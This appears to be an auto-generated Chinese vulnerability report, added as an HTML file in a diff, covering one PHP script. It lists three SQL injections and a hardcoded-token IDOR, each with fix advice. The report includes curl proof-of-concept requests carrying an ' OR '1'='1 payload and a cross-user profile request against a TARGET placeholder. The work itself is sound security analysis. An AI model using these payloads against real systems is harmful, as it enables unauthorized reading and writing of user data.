@@ -1,0 +1,84 @@
+<!doctype html>
+<html lang="zh-CN"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>落日二号漏洞报告 20261031-214049-a23cff</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Microsoft YaHei",sans-serif;margin:0;background:#f6f7f9;color:#1f2328;line-height:1.6}
+header{background:#0b1220;color:#fff;padding:28px 40px}
+header h1{margin:0 0 8px;font-size:26px} header p{margin:2px 0;color:#c9d1d9}
+main{max-width:1180px;margin:24px auto;padding:0 20px}
+.cards{display:flex;gap:14px;flex-wrap:wrap;margin:18px 0}
+.card{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:18px 20px;margin:18px 0;box-shadow:0 1px 2px rgba(0,0,0,.04)}
+.metric{background:#fff;border:1px solid #d8dee4;border-radius:10px;padding:12px 16px;min-width:120px}
+.metric b{display:block;font-size:24px}
+table{width:100%;border-collapse:collapse;margin:10px 0 16px;font-size:14px}
+th,td{border:1px solid #d8dee4;padding:8px 10px;text-align:left;vertical-align:top}
+th{background:#f0f3f6}
+pre{background:#0b1220;color:#d1f0d1;padding:12px;border-radius:8px;overflow:auto;font-size:13px}
+code{font-family:ui-monospace,SFMono-Regular,Consolas,monospace}
+.muted{color:#59636e;font-size:13px}
+.sev{display:inline-block;padding:1px 8px;border-radius:999px;color:#fff;font-size:12px}
+.sev-critical{background:#a40e26} .sev-high{background:#cf222e} .sev-medium{background:#bf8700} .sev-low{background:#6e7781}
+a{color:#0969da}
+</style></head><body>
+<header><h1>落日二号漏洞挖掘报告</h1>
+<p>run_id: 20261031-214049-a23cff · 生成时间: 2026-10-31T13:41:58.173695+00:00</p>
+<p>输入: $WORKSPACE\暴风星云裂\009.zip · SHA256: 541554841eafd869888c6f913c00fe17c4ae258598cf3ee74def3c3f80990814</p></header>
+<main>
+<div class="cards">
+<div class="metric"><b>4</b>findings</div>
+<div class="metric"><b>4</b>含 POC</div>
+<div class="metric"><b>0</b>二次注入链</div>
+<div class="metric"><b>0</b>Prompt 注入迹象</div>
+</div>
+<section class="card"><h2>执行摘要</h2><p>本次汇总基于单文件 PHP 脚本 009.php（79 行）的已去重 findings：共 4 条，其中 3 条为 critical 级 SQL 注入（GEN-07807b8ead6b 日志写入点 line_end=73、GEN-769728152047 用户存在性检查 line_end=22、GEN-1f0233ec126f 用户信息查询 line_end=29），1 条为 medium 级 IDOR（LLM-7d804c24fe1b，硬编码 token 绕过访问控制，line_end=40）。最高危为三处 SQL 注入，均位于同一文件且污点路径极短（source 热点 009.php:9 → sink 热点 009.php:6），一旦参数未经预处理直接拼接即构成未授权数据读取/写入。4 条 finding 均标记 has_poc=true，但需注意：SQL 注入与 IDOR 的 POC 属 HTTP 请求型文本工件（目标统一为 TARGET，仅限授权测试），本次未做任何动态验证，POC 可复现性仅为静态推断。未发现二次注入链（输入未提供存储写点/读点/汇点三元组证据），故不单列。</p>
+<p class="muted">本报告为结构化静态分析结果；未执行 POC、未搭建沙箱。完整机器可读数据见 report.json / report.sarif。</p></section>
+<section class="card"><h2>Findings</h2>
+<table><thead><tr><th>#</th><th>严重度</th><th>类型</th><th>标题</th><th>位置</th><th>置信度</th><th>POC</th></tr></thead>
+<tbody><tr><td>1</td><td><span class='sev sev-critical'>critical</span></td><td><code>sql_injection</code></td><td>009.php 日志写入 SQL 注入（CWE-89）</td><td><code>009.php:73</code></td><td>0.63</td><td>是</td></tr><tr><td>2</td><td><span class='sev sev-critical'>critical</span></td><td><code>sql_injection</code></td><td>009.php 用户存在性检查 SQL 注入（CWE-89）</td><td><code>009.php:22</code></td><td>0.4</td><td>是</td></tr><tr><td>3</td><td><span class='sev sev-critical'>critical</span></td><td><code>sql_injection</code></td><td>009.php 用户信息查询 SQL 注入（CWE-89）</td><td><code>009.php:29</code></td><td>0.4</td><td>是</td></tr><tr><td>4</td><td><span class='sev sev-medium'>medium</span></td><td><code>idor</code></td><td>009.php 用户资料越权访问（硬编码 token 绕过访问控制）</td><td><code>009.php:40</code></td><td>0.8</td><td>是</td></tr></tbody></table></section>
+<section class='card' id='GEN-07807b8ead6b'><h2>F-1 009.php 日志写入 SQL 注入（CWE-89）</h2><p><span class='sev sev-critical'>critical</span> <code>sql_injection</code> / CWE-89 · 置信度 0.63 · candidate / rule_verified+llm</p><p><b>位置：</b><code>009.php:71-73</code></p><p>攻击者通过 HTTP 请求的 query 参数 `user_id`（009.php:17 读取）控制 `$id`，该值被赋给 `$current_user_id` 后直接以字符串插值方式拼入 INSERT 语句 `$log_query`（009.php:71-72），最终在 009.php:73 交给 `mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $log_query)` 执行。代码未使用 `mysqli_real_escape_string`、预处理语句或类型强制转换（如 `intval`），因此单引号可闭合 `&#x27;{$ip}&#x27;` 或数字位 `{$current_user_id}` 上下文注入任意 SQL。</p><p><b>影响：</b>可对 `bac_log` 表执行任意 INSERT/子查询，进而通过报错或时间盲注读取 `users` 等库内数据（账号、口令哈希、日志），在数据库账号权限较高时可写入任意表数据，造成数据泄露与数据完整性破坏。</p><p><b>CVE/CWE 论证：</b>CWE-89：外部可控的 query 参数未经参数化直接拼接进 SQL 并执行，攻击者无需认证即可通过公开页面触发，利用链 source(009.php:17)→拼接(009.php:71-72)→sink(009.php:73) 闭合。</p><p><b>修复建议：</b>改用 mysqli 预处理语句并为占位符绑定参数（`$stmt = $mysqli-&gt;prepare(&quot;INSERT INTO bac_log (user_id,target_id,ip_address) VALUES (?,?,?)&quot;); $stmt-&gt;bind_param(&#x27;iis&#x27;, $current_user_id, $target_id, $ip);`）；对 `user_id`/`target_id` 强制 `intval()`，对 `$ip` 使用 `filter_var(..., FILTER_VALIDATE_IP)` 校验；数据库账号遵循最小权限，仅授予 INSERT 权限。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>009.php:17</code></td><td>从 query `user_id` 读取外部输入</td><td>污点进入 log_query</td><td></td></tr><tr><td>2</td><td><code>009.php:73</code></td><td>危险汇点：mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $log_query);</td><td>污点进入 sql_injection 汇点</td><td>未发现有效净化/参数化</td></tr></tbody></table><h3>POC</h3><p>针对 /009（GET）的 SQL 注入 POC。注入点：GET 参数 user_id；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/009&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 SQL 注入 载荷</b><pre>curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;</pre><div class='muted'>预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;
+</pre><h4>request.http</h4><pre>GET /009 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='GEN-769728152047'><h2>F-2 009.php 用户存在性检查 SQL 注入（CWE-89）</h2><p><span class='sev sev-critical'>critical</span> <code>sql_injection</code> / CWE-89 · 置信度 0.4 · candidate / rule_verified+llm</p><p><b>位置：</b><code>009.php:20-22</code></p><p>同一 query 参数 `user_id`（009.php:17）被赋给 `$id` 后，在 009.php:21 以 `&quot;SELECT user_id FROM users WHERE user_id = &#x27;$id&#x27;&quot;` 形式拼接进 `$check_query`，并在 009.php:22 由 `mysqli_query` 执行。单引号闭合即可注入，代码未做转义或参数化。</p><p><b>影响：</b>可绕过用户存在性判断并读取 `users` 表任意数据（如通过 UNION/布尔盲注枚举 user_id、口令哈希），为后续越权或撞库提供信息。</p><p><b>CVE/CWE 论证：</b>CWE-89：外部 query 参数直接拼接进 SELECT 并执行，无需认证，source(009.php:17)→拼接(009.php:21)→sink(009.php:22) 链路闭合。</p><p><b>修复建议：</b>使用预处理语句绑定 `user_id`（`SELECT user_id FROM users WHERE user_id = ?`），并对输入做 `intval()` 白名单化；统一封装数据库访问层，禁止字符串拼接 SQL。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>009.php:17</code></td><td>从 query `user_id` 读取外部输入</td><td>污点进入 check_query</td><td></td></tr><tr><td>2</td><td><code>009.php:22</code></td><td>危险汇点：$check_result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $check_query);</td><td>污点进入 sql_injection 汇点</td><td>未发现有效净化/参数化</td></tr></tbody></table><h3>POC</h3><p>针对 /009（GET）的 SQL 注入 POC。注入点：GET 参数 user_id；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/009&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 SQL 注入 载荷</b><pre>curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;</pre><div class='muted'>预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;
+</pre><h4>request.http</h4><pre>GET /009 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='GEN-1f0233ec126f'><h2>F-3 009.php 用户信息查询 SQL 注入（CWE-89）</h2><p><span class='sev sev-critical'>critical</span> <code>sql_injection</code> / CWE-89 · 置信度 0.4 · candidate / rule_verified+llm</p><p><b>位置：</b><code>009.php:27-29</code></p><p>在 `$user_exists` 为真分支中，009.php:28 将 `$id` 直接拼入 `&quot;SELECT first_name, last_name, user_id, avatar FROM users WHERE user_id = &#x27;$id&#x27;;&quot;`，并在 009.php:29 由 `mysqli_query` 执行。`$id` 源自 009.php:17 的 query 参数 `user_id`，无转义、无参数化。</p><p><b>影响：</b>可注入 UNION/布尔/时间盲注读取 `users` 表任意列（姓名、头像路径、user_id 等），造成敏感数据泄露；结合前两处注入可扩大读取范围。</p><p><b>CVE/CWE 论证：</b>CWE-89：外部可控 query 参数拼接进 SELECT 并执行，无需认证，source(009.php:17)→拼接(009.php:28)→sink(009.php:29) 闭合。</p><p><b>修复建议：</b>改为预处理语句绑定参数（`SELECT first_name,last_name,user_id,avatar FROM users WHERE user_id = ?`），对 `user_id` 做整数校验；输出侧对 `avatar` 等字段做转义以防二次利用。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>009.php:17</code></td><td>从 query `user_id` 读取外部输入</td><td>污点进入 query</td><td></td></tr><tr><td>2</td><td><code>009.php:29</code></td><td>危险汇点：$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query);</td><td>污点进入 sql_injection 汇点</td><td>未发现有效净化/参数化</td></tr></tbody></table><h3>POC</h3><p>针对 /009（GET）的 SQL 注入 POC。注入点：GET 参数 user_id；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/009&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 SQL 注入 载荷</b><pre>curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;</pre><div class='muted'>预期：布尔条件改变响应内容/长度，或触发 SQL 报错、时间延迟。</div></li><li><b>记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道</b><div class='muted'>预期：出现与基线不同的内容、状态码、延迟或副作用</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X GET &#x27;http://TARGET:8080/009?user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit&#x27;
+</pre><h4>request.http</h4><pre>GET /009 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 47
+
+user_id=%27%20OR%20%271%27%3D%271&amp;Submit=Submit
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section><section class='card' id='LLM-7d804c24fe1b'><h2>F-4 009.php 用户资料越权访问（硬编码 token 绕过访问控制）</h2><p><span class='sev sev-medium'>medium</span> <code>idor</code> / CWE-639 · 置信度 0.8 · candidate / llm_inferred</p><p><b>位置：</b><code>009.php:26-40</code></p><p>第 26 行以 $_GET[&#x27;token&#x27;] == &#x27;user_token&#x27; 作为访问控制，token 为硬编码常量且与当前用户无关；第 28 行按客户端提供的 user_id 查询任意用户资料，未校验该 user_id 是否属于当前登录用户（第 7 行虽查询了当前用户 ID 但未用于授权判断）。任意攻击者提供 token=user_token 即可读取任意用户资料。</p><p><b>影响：</b>未授权读取任意用户个人资料（姓名、头像路径），构成水平越权。</p><p><b>CVE/CWE 论证：</b>CWE-639：访问控制依赖客户端可控的硬编码 token，且未校验对象归属，外部可直接触发。</p><p><b>修复建议：</b>基于服务端会话确定当前用户，禁止客户端指定 user_id；移除硬编码 token。</p><h3>利用链</h3><table><thead><tr><th>#</th><th>位置</th><th>描述</th><th>数据状态</th><th>绕过原因</th></tr></thead><tbody><tr><td>1</td><td><code>009.php:13</code></td><td>读取 action 与 user_id</td><td>客户端可控</td><td></td></tr><tr><td>2</td><td><code>009.php:26</code></td><td>token 硬编码校验通过</td><td>校验通过</td><td>token 为固定常量 user_token，与用户身份无关</td></tr><tr><td>3</td><td><code>009.php:28</code></td><td>按客户端 user_id 查询任意用户资料</td><td>越权查询</td><td></td></tr><tr><td>4</td><td><code>009.php:36</code></td><td>资料回显到页面</td><td>敏感数据泄露</td><td></td></tr></tbody></table><h3>POC</h3><p>针对 /009.php（GET）的 越权 / IDOR POC。注入点：查询 user_id=2 与 Cookie user_id=1 的对象归属对照；payload 使用 TARGET 占位符。</p><ol><li><b>确认目标可达且已获授权</b><pre>curl -sS -i &#x27;http://TARGET:8080/009.php&#x27;</pre><div class='muted'>预期：返回应用页面/接口响应，而不是连接失败</div></li><li><b>发送 越权 / IDOR 载荷</b><pre>curl -sS -i -X GET &#x27;http://TARGET:8080/009.php?action=View%20Profile&amp;user_id=2&#x27; -H &#x27;Cookie: user_id=1&#x27;</pre><div class='muted'>预期：返回用户 ID=2 的资料，即使 Cookie 表示当前用户 ID=1</div></li><li><b>将 user_id 改为当前用户 ID 做对照</b><pre>curl -sS -i -X GET &#x27;http://TARGET:8080/009.php?action=View%20Profile&amp;user_id=1&#x27; -H &#x27;Cookie: user_id=1&#x27;</pre><div class='muted'>预期：对照响应只返回当前用户资料，攻击响应返回另一用户资料</div></li></ol><details><summary>POC 脚本</summary><h4>poc.sh</h4><pre>#!/usr/bin/env sh
+set -eu
+# 仅限授权测试；替换 TARGET 后手动执行
+curl -sS -i -X GET &#x27;http://TARGET:8080/009.php?action=View%20Profile&amp;user_id=2&#x27; -H &#x27;Cookie: user_id=1&#x27;
+</pre><h4>request.http</h4><pre>GET /009.php?action=View%20Profile&amp;user_id=2 HTTP/1.1
+Host: TARGET:8080
+Accept: */*
+Cookie: user_id=1
+
+
+</pre></details><p class='muted'>执行状态：未执行；POC 仅为文本工件，仅限授权测试。</p></section>
+<section class="card"><h2>限制</h2><ul><li>只做源码静态分析，不构建、不部署、不执行 POC、不搭建沙箱。</li><li>finding 的 verdict 为 candidate 或 external，不是动态确认。</li><li>POC 仅为文本工件，目标使用 TARGET 占位符，仅限授权测试。</li><li>规则为轻量级启发式，复杂控制流/常量传播/跨文件调用可能漏报或误报。</li><li>AWVS 是外部动态扫描器，结果只作为佐证；本管线不执行 AWVS 扫描。</li></ul></section>
+</main></body></html>
